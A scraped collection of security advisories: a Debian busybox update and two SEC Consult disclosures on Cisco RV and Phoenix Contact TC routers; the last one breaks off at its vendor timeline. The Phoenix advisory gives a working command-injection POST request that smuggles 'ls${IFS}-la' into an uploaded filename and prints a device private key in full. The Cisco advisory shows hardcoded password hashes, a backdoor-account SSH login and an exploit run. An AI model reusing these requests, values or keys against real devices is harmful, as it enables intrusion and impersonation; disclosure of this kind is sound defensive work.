=== Content from lists.debian.org_0a4831f8_20250125_072658.html ===


---

[[Date Prev](msg00019.html)][[Date Next](msg00021.html)]
[[Thread Prev](msg00019.html)][[Thread Next](msg00021.html)]
[[Date Index](maillist.html#00020)]
[[Thread Index](threads.html#00020)]

# [SECURITY] [DLA 2559-1] busybox security update

---

* *To*: debian-lts-announce <debian-lts-announce@lists.debian.org>
* *Subject*: [SECURITY] [DLA 2559-1] busybox security update
* *From*: Markus Koschany <apo@debian.org>
* *Date*: Mon, 15 Feb 2021 12:56:52 +0100
* *Message-id*: <[[🔎]](/msgid-search/3c09bc84e7943bbff6c3e178d5b65bba49774faa.camel%40debian.org) [3c09bc84e7943bbff6c3e178d5b65bba49774faa.camel@debian.org](msg00020.html)>
* *Mail-followup-to*: debian-lts@lists.debian.org
* *Reply-to*: debian-lts@lists.debian.org

---

```
-------------------------------------------------------------------------
Debian LTS Advisory DLA-2559-1                debian-lts@lists.debian.org
<https://www.debian.org/lts/security/>                      Markus Koschany
February 15, 2021                             <https://wiki.debian.org/LTS>
-------------------------------------------------------------------------

Package        : busybox
Version        : 1:1.22.0-19+deb9u1
CVE ID         : CVE-2011-5325 CVE-2015-9261 CVE-2016-2147 CVE-2016-2148
                 CVE-2017-15873 CVE-2017-16544 CVE-2018-1000517
Debian Bug     : 902724 882258 879732 818497 818499 803097 802702

Busybox, utility programs for small and embedded systems, was affected
by several security vulnerabilities. The Common Vulnerabilities and
Exposures project identifies the following issues.

CVE-2011-5325

    A path traversal vulnerability was found in Busybox implementation
    of tar. tar will extract a symlink that points outside of the
    current working directory and then follow that symlink when
    extracting other files. This allows for a directory traversal
    attack when extracting untrusted tarballs.

CVE-2013-1813

    When device node or symlink in /dev should be created inside
    2-or-deeper subdirectory (/dev/dir1/dir2.../node), the intermediate
    directories are created with incorrect permissions.

CVE-2014-4607

    An integer overflow may occur when processing any variant of a
   "literal run" in the lzo1x_decompress_safe function. Each of these
    three locations is subject to an integer overflow when processing
    zero bytes. This exposes the code that copies literals to memory
    corruption.

CVE-2014-9645

    The add_probe function in modutils/modprobe.c in BusyBox allows
    local users to bypass intended restrictions on loading kernel
    modules via a / (slash) character in a module name, as demonstrated
    by an "ifconfig /usbserial up" command or a "mount -t /snd_pcm none
    /" command.

CVE-2016-2147

    Integer overflow in the DHCP client (udhcpc) in BusyBox allows
    remote attackers to cause a denial of service (crash) via a
    malformed RFC1035-encoded domain name, which triggers an
    out-of-bounds heap write.

CVE-2016-2148

    Heap-based buffer overflow in the DHCP client (udhcpc) in BusyBox
    allows remote attackers to have unspecified impact via vectors
    involving OPTION_6RD parsing.

CVE-2017-15873

    The get_next_block function in archival/libarchive
    /decompress_bunzip2.c in BusyBox has an Integer Overflow that may
    lead to a write access violation.

CVE-2017-16544

    In the add_match function in libbb/lineedit.c in BusyBox, the tab
    autocomplete feature of the shell, used to get a list of filenames
    in a directory, does not sanitize filenames and results in executing
    any escape sequence in the terminal. This could potentially result
    in code execution, arbitrary file writes, or other attacks.

CVE-2018-1000517

    BusyBox contains a Buffer Overflow vulnerability in
    Busybox wget that can result in a heap-based buffer overflow.
    This attack appears to be exploitable via network connectivity.

CVE-2015-9621

    Unziping a specially crafted zip file results in a computation of an
    invalid pointer and a crash reading an invalid address.

For Debian 9 stretch, these problems have been fixed in version
1:1.22.0-19+deb9u1.

We recommend that you upgrade your busybox packages.

For the detailed security status of busybox please refer to
its security tracker page at:
<https://security-tracker.debian.org/tracker/busybox>

Further information about Debian LTS security advisories, how to apply
these updates to your system and frequently asked questions can be
found at: <https://wiki.debian.org/LTS>

```

**Attachment:
[signature.asc](pgpyj6deI0kM_.pgp)**

*Description:* This is a digitally signed message part

---



=== Content from r.sec-consult.com_c99021a1_20250126_071359.html ===


##

### is a Branded Short Domain

[Learn more](https://www.rebrandly.com)     *or*     [Get started](https://www.rebrandly.com/pricing)



=== Content from seclists.org_150ebab6_20250125_072650.html ===

[![](/shared/images/nst-icons.svg#menu)](#menu)
![](/shared/images/nst-icons.svg#close)
[![Home page logo](/images/sitelogo.png)](/)
[Nmap.org](https://nmap.org/)
[Npcap.com](https://npcap.com/)
[Seclists.org](https://seclists.org/)
[Sectools.org](https://sectools.org)
[Insecure.org](https://insecure.org/)

![](/shared/images/nst-icons.svg#search)

[![fulldisclosure logo](/images/fulldisclosure-logo.png)](/fulldisclosure/)
## [Full Disclosure](/fulldisclosure/) mailing list archives

[![Previous](/images/left-icon-16x16.png)](4)
[By Date](date.html#7)
[![Next](/images/right-icon-16x16.png)](8)

[![Previous](/images/left-icon-16x16.png)](4)
[By Thread](index.html#7)
[![Next](/images/right-icon-16x16.png)](8)

![](/shared/images/nst-icons.svg#search)

# SEC Consult SA-20190904-0 :: Multiple vulnerabilities in Cisco router series RV34X, RV26X and RV16X

---

*From*: SEC Consult Vulnerability Lab <research () sec-consult com>

*Date*: Wed, 4 Sep 2019 23:20:24 +0200

---

```
SEC Consult Vulnerability Lab Security Advisory < 20190904-0 >
=======================================================================
              title: Multiple vulnerabilities
            product: Cisco RV340, Cisco RV340W, Cisco RV345, Cisco RV345P,
                     Cisco RV260, Cisco RV260P, Cisco RV260W, Cisco 160,
                     Cisco 160W
 vulnerable version: Cisco RV34X - 1.0.02.16, Cisco RV16X/26X - 1.0.00.15
      fixed version: see "Solution"
         CVE number: -
             impact: High
           homepage: <https://www.cisco.com/>
              found: 2019-05-15
                 by: T. Weber, S. Viehböck (Office Vienna)
                     IoT Inspector
                     SEC Consult Vulnerability Lab

                     An integrated part of SEC Consult
                     Europe | Asia | North America

                     <https://www.sec-consult.com>

=======================================================================

Vendor description:
-------------------
"Securely connecting your small business to the outside world is as important
as connecting your internal network devices to one another. Cisco Small
Business RV Series Routers offer virtual private networking (VPN) technology
so your remote workers can connect to your network through a secure Internet
pathway."

Source: <https://www.cisco.com/c/en/us/products/routers/small-business-rv-series-routers/index.html>

Business recommendation:
------------------------
We want to thank Cisco for the very quick and professional response and great
coordination. Customers are urged to update the firmware of their devices.

Vulnerability overview/description:
-----------------------------------
1) Hardcoded Credentials
The device contains hardcoded users and passwords which can be used to login
via SSH on an emulated device at least.

During the communication with Cisco it turned out that:
"Accounts like the 'debug-admin' and 'root' can not be accessed
from console port, CLI or webui".
Therefore, these accounts had no real functionality and cannot be used for
malicious actions.

2) Known GNU glibc Vulnerabilities
The used GNU glibc in version 2.19 is outdated and contains multiple known
vulnerabilities. The outdated version was found by IoT Inspector. One of
the discovered vulnerabilities (CVE-2015-7547, "getaddrinfo() buffer overflow")
was verified by using the MEDUSA scalable firmware runtime.

3) Known BusyBox Vulnerabilities
The used BusyBox toolkit in version 1.23.2 is outdated and contains multiple
known vulnerabilities. The outdated version was found by IoT Inspector.
One of the discovered vulnerabilities (CVE-2017-16544) was verified by using
the MEDUSA scaleable firmware runtime.

4) Multiple Vulnerabilities - IoT Inspector Report
Further information can be found in IoT Inspector report:
<https://r.sec-consult.com/ciscoiot>

Proof of concept:
-----------------
1) Hardcoded Credentials
The following hardcoded hashes were found in the 'shadow' file of the firmware:
root:$1$hPNSjUZA$7eKqEpqVYltt9xJ6f0OGf0:15533:0:99999:7:::
debug-admin:$1$.AAm0iJ4$na9wZwly9pSrdS8MhcGKw/:15541:0:99999:7:::
[...]

The undocumented user 'debug-admin' is also contained in this file.

Starting the dropbear daemon as background process on emulated firmware:
-------------------------------------------------------------------------------
# dropbear -E
# [1109] <timestamp> Running in background
#
# [1112] <timestamp> Child connection from <IP>:52718
[1112] <timestamp> /var must be owned by user or root, and not writable by others
[1112] <timestamp> Password auth succeeded for 'debug-admin' from <IP>:52718
-------------------------------------------------------------------------------

Log on via another host connected to the same network. For this PoC the
password of the debug-admin was changed in the 'shadow' file.
-------------------------------------------------------------------------------
[root@localhost medusa]# ssh debug-admin@<IP> /bin/ash -i
debug-admin@<IP>'s password:
/bin/ash: can't access tty; job control turned off

BusyBox v1.23.2 (2018-11-21 18:22:56 IST) built-in shell (ash)

/tmp $
-------------------------------------------------------------------------------

The 'debug-admin' user has the same privileges like 'root'. This can be
determined from the corresponding sudoers file in the firmware:
[...]
## User privilege specification
##
root ALL=(ALL) ALL
debug-admin ALL=(ALL) ALL

## Uncomment to allow members of group wheel to execute any command
# %wheel ALL=(ALL) ALL
[...]

During the communication with Cisco it turned out that:
"Accounts like the 'debug-admin' and 'root' can not be accessed
from console port, CLI or webui".
Therefore, these accounts had no real functionality and cannot be used for
malicious actions.

2) Known GNU glibc Vulnerabilities
GNU glibc version 2.19 contains multiple CVEs like:
CVE-2014-4043, CVE-2014-9402, CVE-2014-9761, CVE-2014-9984, CVE-2015-1472,
CVE-2015-5277, CVE-2015-8778, CVE-2015-8779, CVE-2017-1000366 and more.

The getaddrinfo() buffer overflow vulnerability was checked with the help of
the exploit code from <https://github.com/fjserna/CVE-2015-7547>. It was compiled
and executed on the emulated device to test the system.

# python cve-2015-7547-poc.py &
[1] 961
# chroot /medusa_rootfs/ bin/ash

BusyBox v1.23.2 (2018-11-21 18:22:56 IST) built-in shell (ash)

# gdb cve-2015-7547_glibc_getaddrinfo
[...]
[UDP] Total Data len recv 36
[UDP] Total Data len recv 36
Connected with 127.0.0.1:41782
[TCP] Total Data len recv 76
[TCP] Request1 len recv 36
[TCP] Request2 len recv 36
Cannot access memory at address 0x4

Program received signal SIGSEGV, Segmentation fault.
0x76f1fd58 in ?? () from /lib/libc.so.6
(gdb)

References:
<https://security.googleblog.com/2016/02/cve-2015-7547-glibc-getaddrinfo-stack.html>
<https://github.com/fjserna/CVE-2015-7547>

3) Known BusyBox Vulnerabilities
BusyBox version 1.23.2 contains multiple CVEs like:
CVE-2016-2148, CVE-2016-6301, CVE-2015-9261, CVE-2016-2147, CVE-2018-20679,
CVE-2017-16544 and CVE-2019-5747.
The BusyBox shell autocompletion vulnerability (CVE-2017-16544) was verified on
an emulated device:

A file with the name "\ectest\n\e]55;test.txt\a" was created to trigger the
vulnerability.
-------------------------------------------------------------------------------
# ls "pressing <TAB>"
test
]55;test.txt
#
-------------------------------------------------------------------------------

4) Multiple Vulnerabilities - IoT Inspector Report
Further information can be found in IoT Inspector report:
<https://r.sec-consult.com/ciscoiot>

The summary is below:
IoT Inspector Vulnerability #1 BusyBox CVE entries
Outdated BusyBox version is affected by 7 published CVEs.

IoT Inspector Vulnerability #2 curl CVE entries
Outdated curl version is affected by 35 published CVEs.

IoT Inspector Vulnerability #3 GNU glibc CVE entries
Outdated GNU glibc version is affected by 44 published CVEs.

IoT Inspector Vulnerability #4 GNU glibc getaddrinfo() buffer overflow
Outdated GNU glibc version is affected by CVE-2015-7547.

IoT Inspector Vulnerability #5 Hardcoded password hashes
Firmware contains multiple hardcoded credentials.

IoT Inspector Vulnerability #6 Linux Kernel CVE entries
Outdated Linux Kernel version affected by 512 published CVEs.

IoT Inspector Vulnerability #7 MiniUPnPd CVE entries
Outdated MiniUPnPd version affected by 2 published CVEs.

IoT Inspector Vulnerability #8 Dnsmasq CVE entries
Outdated MiniUPnPd version affected by 1 published CVE.

IoT Inspector Vulnerability #9 Linux Kernel Privilege Escalation “pp_key”
Outdated Linux Kernel version is affected by CVE-2015-7547.

IoT Inspector Vulnerability #10 OpenSSL CVE entries
Outdated OpenSSL  version affected by 6 published CVEs.

Vulnerable / tested versions:
-----------------------------
The following firmware versions have been tested with IoT Inspector and
firmware emulation techniques:
Cisco RV340  / 1.0.02.16
Cisco RV340W / 1.0.02.16
Cisco RV345  / 1.0.02.16
Cisco RV345P / 1.0.02.16
The following firmware versions have been tested with IoT Inspector only:
Cisco RV260  / 1.0.00.15
Cisco RV260P / 1.0.00.15
Cisco RV260W / 1.0.00.15
Cisco RV160  / 1.0.00.15
Cisco RV160P / 1.0.00.15

The firmware was obtained from the vendor website:
<https://software.cisco.com/download/home/286287791/type/282465789/release/1.0.02.16>
<https://software.cisco.com/download/home/286316464/type/282465789/release/1.0.00.15>

Vendor contact timeline:
------------------------
2019-05-15: Contacting vendor through psirt () cisco com.
2019-05-16: Vendor confirmed the receipt.
2019-05-2019-08: Periodic updates about the investigation from the vendor.
            Clarification which of the reported issues will be fixed.
2019-08-20: The vendor proposed the next possible publication date for the
            advisory for 2019-09-04. The vendor added the RV160 and RV260
            router series to be vulnerable to the same issues too.
2019-09-04: Coordinated advisory release.

Solution:
---------
Upgrade to the newest available firmware version.

Additionally, the vendor provides the following security notice:
<https://tools.cisco.com/security/center/content/CiscoSecurityAdvisory/cisco-sa-20190904-sb-vpnrouter>

Workaround:
-----------
None.

Advisory URL:
-------------
<https://www.sec-consult.com/en/vulnerability-lab/advisories/index.html>

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

SEC Consult Vulnerability Lab

SEC Consult
Europe | Asia | North America

About SEC Consult Vulnerability Lab
The SEC Consult Vulnerability Lab is an integrated part of SEC Consult. It
ensures the continued knowledge gain of SEC Consult in the field of network
and application security to stay ahead of the attacker. The SEC Consult
Vulnerability Lab supports high-quality penetration testing and the evaluation
of new offensive and defensive technologies for our customers. Hence our
customers obtain the most current information about vulnerabilities and valid
recommendation about the risk profile of new technologies.

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
Interested to work with the experts of SEC Consult?
Send us your application <https://www.sec-consult.com/en/career/index.html>

Interested in improving your cyber security with the experts of SEC Consult?
Contact our local offices <https://www.sec-consult.com/en/contact/index.html>
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

Mail: research at sec-consult dot com
Web: <https://www.sec-consult.com>
Blog: <http://blog.sec-consult.com>
Twitter: <https://twitter.com/sec_consult>

EOF T. Weber / @2019

```

**Attachment:
[smime.p7s](att-7/smime_p7s.bin)**

*Description:* S/MIME Cryptographic Signature

```

_______________________________________________
Sent through the Full Disclosure mailing list
<https://nmap.org/mailman/listinfo/fulldisclosure>
Web Archives & RSS: <http://seclists.org/fulldisclosure/>
```

---

[![Previous](/images/left-icon-16x16.png)](4)
[By Date](date.html#7)
[![Next](/images/right-icon-16x16.png)](8)

[![Previous](/images/left-icon-16x16.png)](4)
[By Thread](index.html#7)
[![Next](/images/right-icon-16x16.png)](8)

### Current thread:

* **SEC Consult SA-20190904-0 :: Multiple vulnerabilities in Cisco router series RV34X, RV26X and RV16X** *SEC Consult Vulnerability Lab (Sep 04)*

![](/shared/images/nst-icons.svg#search)

## [Nmap Security Scanner](https://nmap.org/)

* [Ref Guide](https://nmap.org/book/man.html)* [Install Guide](https://nmap.org/book/install.html)* [Docs](https://nmap.org/docs.html)* [Download](https://nmap.org/download.html)* [Nmap OEM](https://nmap.org/oem/)

## [Npcap packet capture](https://npcap.com/)

* [User's Guide](https://npcap.com/guide/)* [API docs](https://npcap.com/guide/npcap-devguide.html#npcap-api)* [Download](https://npcap.com/#download)* [Npcap OEM](https://npcap.com/oem/)

## [Security Lists](https://seclists.org/)

* [Nmap Announce](https://seclists.org/nmap-announce/)* [Nmap Dev](https://seclists.org/nmap-dev/)* [Full Disclosure](https://seclists.org/fulldisclosure/)* [Open Source Security](https://seclists.org/oss-sec/)* [BreachExchange](https://seclists.org/dataloss/)

## [Security Tools](https://sectools.org)

* [Vuln scanners](https://sectools.org/tag/vuln-scanners/)* [Password audit](https://sectools.org/tag/pass-audit/)* [Web scanners](https://sectools.org/tag/web-scanners/)* [Wireless](https://sectools.org/tag/wireless/)* [Exploitation](https://sectools.org/tag/sploits/)

## [About](https://insecure.org/)

* [About/Contact](https://insecure.org/fyodor/)* [Privacy](https://insecure.org/privacy.html)* [Advertising](https://insecure.org/advertising.html)* [Nmap Public Source License](https://nmap.org/npsl/)

[![](/shared/images/nst-icons.svg#twitter)](https://twitter.com/nmap "Visit us on Twitter")
[![](/shared/images/nst-icons.svg#facebook)](https://facebook.com/nmap "Visit us on Facebook")
[![](/shared/images/nst-icons.svg#github)](https://github.com/nmap/ "Visit us on Github")
[![](/shared/images/nst-icons.svg#reddit)](https://reddit.com/r/nmap/ "Discuss Nmap on Reddit")



=== Content from packetstormsecurity.com_c41862f1_20250125_072646.html ===

[![](/logos/smalllogobeta.png)](/)

* files
* news
* users
* cve

[![](/logos/smalllogobeta.png)](/)

* files
* news
* users
* cve

![](/logos/linegray.png)

 [About](/help/view/4) |
[Terms](/tos/) |
[Copyright](/help/view/7) |
[Privacy](/help/view/6) |
[BlueSky](https://bsky.app/profile/packetstorm.bsky.social) |
[X](https://x.com/packet_storm) |
[Mastodon](https://infosec.exchange/%40packet_storm/)



=== Content from seclists.org_bc851929_20250125_072652.html ===

[![](/shared/images/nst-icons.svg#menu)](#menu)
![](/shared/images/nst-icons.svg#close)
[![Home page logo](/images/sitelogo.png)](/)
[Nmap.org](https://nmap.org/)
[Npcap.com](https://npcap.com/)
[Seclists.org](https://seclists.org/)
[Sectools.org](https://sectools.org)
[Insecure.org](https://insecure.org/)

![](/shared/images/nst-icons.svg#search)

[![fulldisclosure logo](/images/fulldisclosure-logo.png)](/fulldisclosure/)
## [Full Disclosure](/fulldisclosure/) mailing list archives

[![Previous](/images/left-icon-16x16.png)](14)
[By Date](date.html#15)
[![Next](/images/right-icon-16x16.png)](16)

[![Previous](/images/left-icon-16x16.png)](16)
[By Thread](index.html#15)
[![Next](/images/right-icon-16x16.png)](17)

![](/shared/images/nst-icons.svg#search)

# SEC Consult SA-20200312-0 :: Authenticated Command Injection in Phoenix Contact TC Router & TC Cloud Client

---

*From*: SEC Consult Vulnerability Lab <research () sec-consult com>

*Date*: Fri, 13 Mar 2020 16:52:21 +0100

---

```
SEC Consult Vulnerability Lab Security Advisory < 20200312-0 >
=======================================================================
              title: Authenticated Command Injection
            product: Phoenix Contact TC Router & TC Cloud Client
 vulnerable version: <=2.05.3 & <=2.03.17 & <=1.03.17
      fixed version: 2.05.4 & 2.03.18 & 1.03.18
         CVE number: CVE-2020-9436, CVE-2020-9435
             impact: High
           homepage: <https://www.phoenixcontact.com/>
              found: 2020-01-23
                 by: T. Weber (Office Vienna)
                     SEC Consult Vulnerability Lab

                     An integrated part of SEC Consult
                     Europe | Asia | North America

                     <https://www.sec-consult.com>

=======================================================================

Vendor description:
-------------------
"Phoenix Contact is a globally present, Germany-based market leader. Our group
is synonymous with future-oriented components, systems, and solutions in the
fields of electrical engineering, electronics, and automation. A global network
across more than 100 countries and 15,000 employees ensure close proximity to
our customers, which we believe is particularly important."

Source:
<https://www.phoenixcontact.com/online/portal/pc?1dmy&urile=wcm%3apath%3a/pcen/web/corporate/company/subcategory_pages/Who_we_are/>

Business recommendation:
------------------------
The vendor provides a patch which should be installed immediately.

SEC Consult recommends to perform a thorough security review of these products
conducted by security professionals to identify and resolve all security issues.

Vulnerability overview/description:
-----------------------------------
1) Known BusyBox Vulnerabilities
The used BusyBox toolkit in version 1.18.5 is outdated and contains multiple
known vulnerabilities. The outdated version was found by IoT Inspector.
One of the discovered vulnerabilities (CVE-2017-16544) was verified by using
the MEDUSA scalable firmware runtime.

2) Authenticated Command Injection (CVE-2020-9436)
An authenticated command injection vulnerability can be triggered by issuing a
POST request to the "/cgi-bin/p/adm/cfg" CGI program which is available on the
web interface. An attacker can abuse this vulnerability to compromise the
operating system of the device. This issue was found by emulating the firmware
of the device.

3) Embedded Private X.509 Certificate (CVE-2020-9435)
The device contains a hardcoded certificate which can be used to run the web
service. This certificate is used for HTTPS (default server certificate for
web based configuration and management).

Impersonation, man-in-the-middle or passive decryption attacks are possible.
These attacks allow an attacker to gain access to sensitive information like
admin credentials and use them in further attacks.

Proof of concept:
-----------------
1) Known BusyBox Vulnerabilities
BusyBox version 1.18.5 contains multiple CVEs like:
CVE-2016-6301, CVE-2014-9645 and CVE-2013-1813.

The BusyBox shell autocompletion vulnerability (CVE-2017-16544) was verified on
an emulated device:

A file with the name "\ectest\n\e]55;test.txt\a" was created to trigger the
vulnerability.
-------------------------------------------------------------------------------
# ls "pressing <TAB>"
test
]55;test.txt
#
-------------------------------------------------------------------------------

2) Authenticated Command Injection (CVE-2020-9436)
An authenticated command injection is possible via a crafted POST request.

The configuration upload form in the web-interface can be used to upload an XML
configuration file. The filename of this XML file can be modified with an
interceptor proxy in order to inject system commands. The JavaScript code which
is used to do client-side filtering can be bypassed in this way. Because of
blacklisting of some characters, the ${IFS} command must be used for adding
whitespaces.

Request:
-------------------------------------------------------------------------------
POST /cgi-bin/p/adm/cfg HTTP/1.1
Host: $IP
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: multipart/form-data; boundary=---------------------------10834433251208329385252513488
Content-Length: 724
Authorization: Basic YWRtaW46YWRtaW4=
Connection: close
Upgrade-Insecure-Requests: 1
Cache-Control: no-transform

-----------------------------10834433251208329385252513488
Content-Disposition: form-data; name="exportmode"

0
-----------------------------10834433251208329385252513488
Content-Disposition: form-data; name="xmlmode"

on
-----------------------------10834433251208329385252513488
Content-Disposition: form-data; name="importmode"

0
-----------------------------10834433251208329385252513488
Content-Disposition: form-data; name="cfg_upload"; filename="config.xml;ls${IFS}-la"
Content-Type: application/octet-stream

text

-----------------------------10834433251208329385252513488
Content-Disposition: form-data; name="cfg_submit"

-----------------------------10834433251208329385252513488--

Response from the web-server:

HTTP/1.0 200 OK
Content-Type: text/html
Cache-Control: no-cache

<!DOCTYPE html>
<html>
<head>
<meta charset="utf-8"><meta http-equiv="Cache-Control" content="no-cache">
<style>
/* CSS main */

body
{
  font-family: verdana, arial, helvetica, sans-serif;
  font-size: 12px;
}
[...snip...]
.TextWarning
{
  vertical-align: middle;
  color: #FF4000;
}
</style>
<title>Configuration up-/download</title>
</head>
<body>
<pre>xml parsed
setup new config done
total 499
drwxr-xr-x    2 root     root          1024 Jan 28  2020 .
drwxr-xr-x    3 root     root          1024 Jan 28  2020 ..
-rwxr-xr-x    1 root     root          5544 Jan 28  2020 atcmd
-rwxr-xr-x    1 root     root          9624 Jan 28  2020 basicsetup
-rwxr-xr-x    1 root     root          9012 Jan 28  2020 cfg
-rwxr-xr-x    1 root     root          7396 Jan 28  2020 conchk
-rwxr-xr-x    1 root     root          9128 Jan 28  2020 ddns
-rwxr-xr-x    1 root     root         14504 Jan 28  2020 dhcp
-rwxr-xr-x    1 root     root          4776 Jan 28  2020 dmesg
-rwxr-xr-x    1 root     root          6040 Jan 28  2020 edit_email
-rwxr-xr-x    1 root     root          6648 Jan 28  2020 edit_sms
-rwxr-xr-x    1 root     root         18288 Jan 28  2020 fw
-rwxr-xr-x    1 root     root         10560 Jan 28  2020 gprs
-rwxr-xr-x    1 root     root         12268 Jan 28  2020 gsm
-rwxr-xr-x    1 root     root          6784 Jan 28  2020 gsmlog
-rwxr-xr-x    1 root     root         11172 Jan 28  2020 io
-rwxr-xr-x    1 root     root          9812 Jan 28  2020 ipscert
-rwxr-xr-x    1 root     root          7604 Jan 28  2020 ipscon
-rwxr-xr-x    1 root     root          9928 Jan 28  2020 ipsike
-rwxr-xr-x    1 root     root         16728 Jan 28  2020 ipsset
-rwxr-xr-x    1 root     root         13808 Jan 28  2020 lanif
-rwxr-xr-x    1 root     root          5528 Jan 28  2020 leases
-rwxr-xr-x    1 root     root          6512 Jan 28  2020 log
-rwxr-xr-x    1 root     root          9656 Jan 28  2020 masqtbl
-rwxr-xr-x    1 root     root          5313 Jan 28  2020 mdmupl
-rwxr-xr-x    1 root     root         17912 Jan 28  2020 napt
-rwxr-xr-x    1 root     root          7704 Jan 28  2020 ovpnadvanced
-rwxr-xr-x    1 root     root          9656 Jan 28  2020 ovpncert
-rwxr-xr-x    1 root     root          6524 Jan 28  2020 ovpncon
-rwxr-xr-x    1 root     root          7856 Jan 28  2020 ovpnkey
-rwxr-xr-x    1 root     root         13012 Jan 28  2020 ovpnnapt
-rwxr-xr-x    1 root     root         19732 Jan 28  2020 ovpntunnel
-rwxr-xr-x    1 root     root          4760 Jan 28  2020 phonebook
-rwxr-xr-x    1 root     root          8284 Jan 28  2020 reboot
-rwxr-xr-x    1 root     root          5956 Jan 28  2020 routes
-rwxr-xr-x    1 root     root         10840 Jan 28  2020 rtc
-rwxr-xr-x    1 root     root          6928 Jan 28  2020 security
-rwxr-xr-x    1 root     root         17860 Jan 28  2020 sim
-rwxr-xr-x    1 root     root          7080 Jan 28  2020 sms
-rwxr-xr-x    1 root     root          7960 Jan 28  2020 smtp
-rwxr-xr-x    1 root     root          7048 Jan 28  2020 snmp
-rwxr-xr-x    1 root     root          5964 Jan 28  2020 socksrv
-rwxr-xr-x    1 root     root          9632 Jan 28  2020 sroute
-rwxr-xr-x    1 root     root         14668 Jan 28  2020 srvfw
-rwxr-xr-x    1 root     root          5456 Jan 28  2020 sshconfig
-rwxr-xr-x    1 root     root         11224 Jan 28  2020 sysconfig
-rwxr-xr-x    1 root     root         19996 Jan 28  2020 test
-rwxr-xr-x    1 root     root          4712 Jan 28  2020 update
-rwxr-xr-x    1 root     root            73 Jan 28  2020 upload
-rwxr-xr-x    1 root     root            30 Jan 28  2020 upremove
-rwxr-xr-x    1 root     root          7132 Jan 28  2020 user
-rwxr-xr-x    1 root     root          9672 Jan 28  2020 webcert
-rwxr-xr-x    1 root     root         10932 Jan 28  2020 webconfig
</pre><pre>please reboot next</pre>
</body>
</html>

3) Embedded Private X.509 Certificate (CVE-2020-9435)
The X.509 certificate was found on more than one device on Censys.io:
SHA256 fingerprint: 8ca503b99f7eadc839747dfe612b256efcdc4e01bbf5757c0fb663e5a22836b8

-----BEGIN PRIVATE KEY-----
MIIEvgIBADANBgkqhkiG9w0BAQEFAASCBKgwggSkAgEAAoIBAQDm6jUy8KLYSPXo
BiPx8LAlVcV4/6+pi+d4KzH6rvSoREYrjpalUMGbmoAdtbkr3qzvrLMP0s7tDOQB
YfH40u1QvEWgN5iWGz+TONXbeg7p+ZjD63Cu+tu9Knj5ZoZ7zDVgOF2UaVVrQkpH
CYXagnaplnQCbc1DiuvG8ha9ICaWuf7upNPiNpgdiGqrPwaqSCYhmi7K7Ej4dOpZ
5Ji/LKxCGjokVpxlYgbJbNMtrBXdBjsVh8WMImxQe7g00CQhMIK6YfE7eOsXDTLP
ZDXIbf42emJ84kpU57ISI9ru1gmt7Jkl0EJlTwyMV/9NUXavpf15LnpKnkXK0Ez/
Fu5erzVBAgMBAAECggEBAMP65yfSwAMc+UfxXjSK+JTXVQA60ZXuXYfJ8WM3dgIR
4BQ7snOgNJGh8TZF82DeXpwUUO0PF/xswl7CCCIMssmg4N74EJLlkXGb/TWHRH0k
D5nIixyXYEQOdhoGAAG18V82t4WsWIjt/CiKVoZ7z8ZjIRampl263B0/fjkJvnaQ
zDzeF0Pnh9UAyjJQiec6wEFO2FUmU0XHgWOylzTUm+kWPg3de4SNA6kpSbOFKM4y
xjdVUBK6ECT42EaJK5Ie3Fk3wKH11HQSYr2wRkC3VbN9XU4qUiOeQzNgAX5FRaBd
Egyu1gkJvOOiKCmBB3hyoJA8eipyMoOtuWRJnO0aRBkCgYEA/qZrfYIUn/OA3iPe
809eJoLsMI4ACOf46W4irskoOF1qRZ0WJZtbIY3vcsw+m+sKYZW8RyUrl9UoOhVT
yYMNlhwWOyztvp+jembEiS1XaW9K5gfV7Z/+KAenGjd/MLvRB5GU9Yt0knyY5QwP
rcQgE/Pgr19o++e2my+1etzxAD8CgYEA6COT0Am0ECGrIm+rR4VYlvMaT1V/RTpY
WOfo7gExbyBj45vrTWKNGm1eAthOXwYLHA0Aan3bOrw3fprAmWrc1dhHC3+1Kjrn
mqOv/rWzpN1WRbehNJd0VmcTI9M1XDONTbrs44cvN+Fpt88gxXFkDTRZs7onMPz5
eOCNdGV6an8CgYB2l5htrfve9e8pBPmaxHarZsOKZUc83pN8Wq9KSSIzBcYtP1gG
EZDiUpCWHOp3gIGoKqyxUW0426tNSYtoyGC2bMQpsOXTpdLjeSLEY9pWnt75u+J0
NNOPXukCe5//WSii5rjBlb2nTuGBohlXKoRp5mTYJ43j6uiO4ywYWPbfzwKBgQDN
RMBswlfNt+fbAIGlMZ1/hSHrqv9qWMhMfW00ICv1Rt/tIS91c0Kwbqslut26Gt7y
A/EtOXMEwfAUbIUIZD04fxF7cobg+8tWq41xnnxmuS2TYmgS2CYQTP7Yu+fASvmV
FUhpfV1cfV99IJOq47SEFJmJWn9TSy7SG0YZ+a3AwwKBgEXATr+IAy04ASrtOf2Z
ySc5PbttVW1gMJd+BpyaXPa2qf7w/jELbOCfu4qe17qD2yufgyOzurikFfNayVbt
xkOmyj24eKmwHKH+zmUy63i+kqiRqXUpypmFQzPRf7LQXYPZEv7IkVP/+ney4G9T
a0lM1ut6+1o9FLcqrnZk9uLY
-----END PRIVATE KEY-----

Vulnerable / tested versions:
-----------------------------
The following firmware version has been tested:

* TC Router 3002T-4G ATT / 2.05.3
* TC Cloud Client 1002-TX/TX / 1.03.17

According to the vendor, the following devices are affected as well:

Article name                Article number   Affected versions
TC ROUTER 3002T-4G          2702528          <= 2.05.3
TC ROUTER 3002T-4G          2702530          <= 2.05.3
TC ROUTER 2002T-3G          2702529          <= 2.05.3
TC ROUTER 2002T-3G          2702531          <= 2.05.3
TC ROUTER 3002T-4G VZW      2702532          <= 2.05.3
TC ROUTER 3002T-4G ATT      2702533          <= 2.05.3
TC CLOUD CLIENT 1002-4G     2702886          <= 2.03.17
TC CLOUD CLIENT 1002-4G VZW 2702887          <= 2.03.17
TC CLOUD CLIENT 1002-4G ATT 2702888          <= 2.03.17
TC CLOUD CLIENT 1002-TXTX   2702885          <= 1.03.17

Vendor contact timeline:
------------------------
